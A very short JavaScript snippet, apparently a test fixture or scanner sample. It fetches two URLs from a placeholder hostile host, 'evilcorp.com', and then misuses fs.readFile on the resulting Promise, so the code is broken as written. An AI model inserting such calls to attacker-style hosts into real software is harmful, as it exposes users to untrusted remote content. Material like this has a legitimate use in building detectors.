import { readFile } from 'fs';

const files = [fetch('https://evilcorp.com/hacky'), fetch('https://evilcorp.com/hacky-hacky')];

readFile(files[0], (err, data) => {
  if (err) throw err;
});
